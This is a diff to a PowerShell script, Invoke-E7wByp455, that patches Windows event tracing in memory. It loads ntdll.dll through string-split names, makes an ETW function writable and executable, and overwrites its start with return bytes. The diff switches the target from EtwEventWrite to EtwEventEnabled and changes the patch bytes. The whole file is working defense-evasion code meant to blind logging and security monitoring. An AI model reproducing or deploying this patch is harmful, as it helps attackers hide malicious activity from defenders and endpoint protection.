@@ -1,9 +1,9 @@
-$Win32 = @"
+$Win32Etw = @"
 
 using System;
 using System.Runtime.InteropServices;
 
-public class Win32 {
+public class Win32Etw {
 
 
     public static void WriteToMemory(byte[] patch, IntPtr address) {
@@ -43,15 +43,15 @@ function Invoke-E7wByp455{
     Begin {
 		$compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
 		$compilerParameters.CompilerOptions = "/unsafe"
-		Add-Type $Win32 -CompilerParameters $compilerParameters
+		Add-Type $Win32Etw -CompilerParameters $compilerParameters
     }
 
     Process {
-		$LoadLibrary = [Win32]::ll("ntd" + "ll.dll")
-		$Address = [Win32]::gpa($LoadLibrary, "Etw" + "Event" + "W")
+		$LoadLibrary = [Win32Etw]::ll("ntd" + "ll.dll")
+		$Address = [Win32Etw]::gpa($LoadLibrary, "Etw" + "Event" + "Enabled")
 		$p = 0
-		[Win32]::vp($Address, [uint32]1, 0x40, [ref]$p)
-		$Patch = [Byte[]] (0xc3)
-		[Win32]::WriteToMemory($patch, $address)
+		[Win32Etw]::vp($Address, [uint32]3, 0x40, [ref]$p)
+		$Patch = [Byte[]] (0xB0,0x01,0xC3)
+		[Win32Etw]::WriteToMemory($patch, $address)
     }
 }
